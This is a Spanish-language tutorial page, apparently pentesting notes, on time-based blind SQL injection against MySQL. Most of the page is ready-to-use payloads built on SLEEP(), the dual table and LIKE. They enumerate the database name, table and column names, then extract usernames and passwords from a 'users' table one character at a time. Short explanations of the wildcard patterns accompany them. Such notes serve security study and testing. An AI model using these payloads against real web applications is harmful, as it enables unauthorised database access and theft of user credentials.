---
description: >-
  Si el servidor no muestra los resultados de las busquedas, tendremos que
  utilizar este método o el anterior para obtener los resultados.
---

# TIME-BASED BLIND SQLI

## **DETERMINAR EL NOMBRE DE LA BASE DE DATOS CON TIME-BASED BLIND SQL INJECTION**

 Esta forma de aprovechar las vulnerabilidades SQL injection se basa en la orden **SLEEP\(\)** que retrasa la recarga de la pagina, en **tablas duales** y **LIKE**.

 **`1 ‘ AND (SELECT sleep(4) FROM dual WHERE database() LIKE ’HO%') -- -`**

 Esto permite hacer varias cosas:

* Si la condicion segunda se cumple \(detras del where\), se cumplira el sleep.
* LIKE permite hacer la aproximacion letra a letra mas sencilla
* ‘a%’ → indica que empieza por a y el resto es cualquier cosa
* ‘\_\_\_\_’ → indica que la base de datos es de 4 caracteres \(debemos sustituarlas por los caracteres\).

## **DETERMINAR LAS TABLAS CON TIME-BASED BLIND SQL INJECTION**

**`1 ‘ AND (SELECT sleep(4) FROM dual WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=database() LIMIT 0,1) LIKE ’____') -- -`**

 Vamos modificando lo que sigue a LIKE para llegar a obtener el resultado final. Una buena forma es ir reemplazando las vocales en cada posicion.

## **DETERMINAR LAS COLUMNAS CON TIME-BASED BLIND SQL INJECTION**

**`1 ‘ AND (SELECT sleep(4) FROM dual WHERE (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1) LIKE ’____') -- -`**

## **EXTRAER DATOS DE LA BASE DE DATOS CON TIME-BASED BLIND SQL INJECTION**

 Ahora que ya tenemos seleccionadas las COLUMNAS de las que queremos extrar informacion, vamos a por ello:

 **`1 ‘ AND (SELECT sleep(4) FROM dual WHERE (SELECT user FROM users LIMIT 0,1) LIKE ’_____') -- -`**

 **`1 ‘ AND (SELECT sleep(4) FROM dual WHERE (SELECT password FROM users LIMIT 0,1) LIKE ’_____') -- -`**

 Esta password podria estar hasheada lo que haria esta tarea titanica.

